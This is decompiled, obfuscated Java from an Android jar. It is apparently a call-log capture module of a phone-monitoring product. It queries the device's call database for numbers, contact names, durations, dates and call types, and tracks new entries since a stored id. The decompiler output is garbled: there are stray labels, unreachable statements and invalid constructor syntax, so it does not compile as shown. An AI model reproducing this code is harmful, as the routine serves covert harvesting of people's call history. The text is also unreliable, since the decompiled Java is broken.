package com.vvt.capture.calllog.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.calllog.CallData;
import com.vvt.capture.calllog.CallData.Type;
import com.vvt.h.e;
import java.util.ArrayList;
import java.util.List;

public class a
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  private CallData a(Cursor paramCursor)
  {
    int i = paramCursor.getColumnIndex("_id");
    long l1 = paramCursor.getLong(i);
    i = paramCursor.getColumnIndex("number");
    String str1 = paramCursor.getString(i);
    i = paramCursor.getColumnIndex("name");
    String str2 = paramCursor.getString(i);
    i = paramCursor.getColumnIndex("duration");
    int j = paramCursor.getInt(i);
    i = paramCursor.getColumnIndex("date");
    long l2 = paramCursor.getLong(i);
    Object localObject1 = "type";
    i = paramCursor.getColumnIndex((String)localObject1);
    i = paramCursor.getInt(i);
    int k = 1;
    if (i == k) {
      localObject1 = CallData.Type.IN;
    }
    for (;;)
    {
      Object localObject2 = CallData.Type.MISSED;
      if (localObject1 == localObject2) {
        j = 0;
      }
      localObject2 = new com/vvt/capture/calllog/CallData;
      ((CallData)localObject2).<init>();
      ((CallData)localObject2).a(l1);
      ((CallData)localObject2).b(l2);
      ((CallData)localObject2).a((CallData.Type)localObject1);
      long l3 = j;
      ((CallData)localObject2).c(l3);
      ((CallData)localObject2).a(str1);
      ((CallData)localObject2).b(str2);
      return (CallData)localObject2;
      k = 2;
      if (i == k) {
        localObject1 = CallData.Type.OUT;
      } else {
        localObject1 = CallData.Type.MISSED;
      }
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = e.a(bool1);
    if (localObject1 != null)
    {
      bool1 = ((SQLiteDatabase)localObject1).isDbLockedByCurrentThread();
      if (!bool1)
      {
        bool1 = ((SQLiteDatabase)localObject1).isDbLockedByOtherThreads();
        if (!bool1) {
          break label76;
        }
      }
    }
    bool1 = a;
    if ((!bool1) || (localObject1 != null)) {
      ((SQLiteDatabase)localObject1).close();
    }
    localObject1 = localArrayList;
    return (List)localObject1;
    label76:
    Object localObject2 = ((SQLiteDatabase)localObject1).getPath();
    if (localObject2 != null)
    {
      bool3 = a;
      if (!bool3) {}
    }
    Object localObject3 = "logs.db";
    boolean bool3 = ((String)localObject2).contains((CharSequence)localObject3);
    label120:
    int j;
    if (bool3)
    {
      localObject2 = "logs";
      if (!bool3) {
        break label361;
      }
      localObject3 = "%s = %d";
      j = 2;
    }
    for (;;)
    {
      try
      {
        localObject4 = new Object[j];
        int k = 0;
        Object localObject5 = "logtype";
        localObject4[0] = localObject5;
        k = 1;
        int m = 100;
        localObject5 = Integer.valueOf(m);
        localObject4[k] = localObject5;
        localObject4 = String.format((String)localObject3, (Object[])localObject4);
        int i = -1;
        if (paramInt == i) {
          paramInt = -1 >>> 1;
        }
        String str1 = "_id DESC";
        i = 0;
        localObject3 = null;
        k = 0;
        m = 0;
        localObject5 = null;
        String str2 = Integer.toString(paramInt);
        localObject2 = ((SQLiteDatabase)localObject1).query((String)localObject2, null, (String)localObject4, null, null, null, str1, str2);
      }
      catch (SQLiteException localSQLiteException)
      {
        bool1 = false;
        Cursor localCursor = null;
        continue;
        boolean bool4 = a;
        if (!bool4) {
          continue;
        }
        bool4 = localCursor.moveToNext();
        if (!bool4) {
          continue;
        }
        localObject3 = a(localCursor);
        localArrayList.add(localObject3);
        continue;
        if (localCursor == null) {
          continue;
        }
        localCursor.close();
        if (localObject1 == null) {
          continue;
        }
        ((SQLiteDatabase)localObject1).close();
        bool2 = a;
        if (!bool2) {
          continue;
        }
        localObject1 = localArrayList;
      }
      if (localObject2 == null)
      {
        bool1 = a;
        if (bool1) {}
        ((SQLiteDatabase)localObject1).close();
        localObject1 = localArrayList;
        break;
        localObject2 = "calls";
        break label120;
      }
      break;
      label361:
      j = 0;
      Object localObject4 = null;
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject1 = (Long)paramg1.getReference();
    long l = ((Long)localObject1).longValue();
    bool2 = a;
    if (bool2) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localObject1 = e.a(bool1);
    if (localObject1 != null)
    {
      bool1 = ((SQLiteDatabase)localObject1).isDbLockedByCurrentThread();
      if (!bool1)
      {
        bool1 = ((SQLiteDatabase)localObject1).isDbLockedByOtherThreads();
        if (!bool1) {
          break label106;
        }
      }
    }
    bool1 = a;
    if ((!bool1) || (localObject1 != null)) {
      ((SQLiteDatabase)localObject1).close();
    }
    localObject1 = localArrayList;
    for (;;)
    {
      return (List)localObject1;
      label106:
      Object localObject2 = ((SQLiteDatabase)localObject1).getPath();
      if (localObject2 != null)
      {
        bool3 = a;
        if (!bool3) {}
      }
      String str1 = "logs.db";
      boolean bool3 = ((String)localObject2).contains(str1);
      label150:
      int i;
      if (bool3)
      {
        localObject2 = "logs";
        if (!bool3) {
          break label318;
        }
        str1 = "%s = %d AND %s > %d";
        i = 4;
      }
      for (;;)
      {
        try
        {
          arrayOfObject = new Object[i];
          j = 0;
          localObject3 = "logtype";
          arrayOfObject[0] = localObject3;
          j = 1;
          int k = 100;
          localObject3 = Integer.valueOf(k);
          arrayOfObject[j] = localObject3;
          j = 2;
          localObject3 = "_id";
          arrayOfObject[j] = localObject3;
          j = 3;
          localObject4 = Long.valueOf(l);
          arrayOfObject[j] = localObject4;
          str2 = String.format(str1, arrayOfObject);
          bool4 = false;
          localObject4 = null;
          bool3 = false;
          str1 = null;
          i = 0;
          arrayOfObject = null;
          j = 0;
          k = 0;
          localObject3 = null;
          localObject2 = ((SQLiteDatabase)localObject1).query((String)localObject2, null, str2, null, null, null, null);
        }
        catch (SQLiteException localSQLiteException)
        {
          Object[] arrayOfObject;
          int j;
          Object localObject3;
          String str2;
          label318:
          bool1 = false;
          Cursor localCursor = null;
          continue;
          boolean bool4 = a;
          if (!bool4) {
            continue;
          }
          bool4 = localCursor.moveToNext();
          if (!bool4) {
            continue;
          }
          Object localObject4 = a(localCursor);
          localArrayList.add(localObject4);
          continue;
          if (localCursor == null) {
            continue;
          }
          localCursor.close();
          if (localObject1 == null) {
            continue;
          }
          ((SQLiteDatabase)localObject1).close();
          bool2 = a;
          if (!bool2) {
            continue;
          }
          localObject1 = localArrayList;
        }
        if (localObject2 != null) {
          continue;
        }
        bool1 = a;
        if (bool1) {}
        ((SQLiteDatabase)localObject1).close();
        localObject1 = localArrayList;
        break;
        localObject2 = "calls";
        break label150;
        str1 = "%s > %d";
        i = 2;
        arrayOfObject = new Object[i];
        j = 0;
        localObject3 = "_id";
        arrayOfObject[0] = localObject3;
        j = 1;
        localObject4 = Long.valueOf(l);
        arrayOfObject[j] = localObject4;
        str2 = String.format(str1, arrayOfObject);
      }
    }
  }
  
  public FxSimpleEventReference b()
  {
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    Long localLong = Long.valueOf(c());
    localFxSimpleEventReference.setReference(localLong);
    return localFxSimpleEventReference;
  }
  
  public long c()
  {
    boolean bool1 = false;
    Cursor localCursor = null;
    long l = -1;
    boolean bool2 = true;
    boolean bool3 = a;
    if (bool3) {}
    SQLiteDatabase localSQLiteDatabase = e.a(bool2);
    if (localSQLiteDatabase != null)
    {
      bool3 = localSQLiteDatabase.isDbLockedByCurrentThread();
      if (!bool3)
      {
        bool3 = localSQLiteDatabase.isDbLockedByOtherThreads();
        if (!bool3) {
          break label76;
        }
      }
    }
    bool1 = a;
    if ((!bool1) || (localSQLiteDatabase != null)) {
      localSQLiteDatabase.close();
    }
    for (;;)
    {
      return l;
      label76:
      String str = localSQLiteDatabase.getPath();
      if (str != null)
      {
        boolean bool5 = a;
        if (!bool5) {}
      }
      Object localObject1 = "logs.db";
      bool3 = str.contains((CharSequence)localObject1);
      int j;
      if (bool3)
      {
        str = "SELECT MAX(%s) FROM %s WHERE %s = %d";
        j = 4;
      }
      for (;;)
      {
        try
        {
          localObject1 = new Object[j];
          k = 0;
          localObject2 = "_id";
          localObject1[0] = localObject2;
          k = 1;
          localObject2 = "logs";
          localObject1[k] = localObject2;
          k = 2;
          localObject2 = "logtype";
          localObject1[k] = localObject2;
          k = 3;
          int m = 100;
          localObject2 = Integer.valueOf(m);
          localObject1[k] = localObject2;
          str = String.format(str, (Object[])localObject1);
          j = 0;
          localObject1 = null;
          localCursor = localSQLiteDatabase.rawQuery(str, null);
        }
        catch (SQLiteException localSQLiteException)
        {
          int k;
          Object localObject2;
          int i;
          boolean bool4 = b;
          if (!bool4) {
            continue;
          }
          continue;
          bool4 = localCursor.moveToNext();
          if (!bool4) {
            continue;
          }
          l = localCursor.getLong(0);
          localCursor.close();
          localSQLiteDatabase.close();
          bool1 = a;
          if (!bool1) {
            continue;
          }
          bool1 = a;
        }
        if (localCursor != null)
        {
          i = localCursor.getCount();
          if (i != 0) {
            continue;
          }
        }
        bool4 = a;
        if ((!bool4) || (localCursor != null)) {
          localCursor.close();
        }
        localSQLiteDatabase.close();
        break;
        str = "SELECT MAX(%s) FROM %s";
        j = 2;
        localObject1 = new Object[j];
        k = 0;
        localObject2 = "_id";
        localObject1[0] = localObject2;
        k = 1;
        localObject2 = "calls";
        localObject1[k] = localObject2;
        str = String.format(str, (Object[])localObject1);
      }
      if (!bool1) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calllog/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */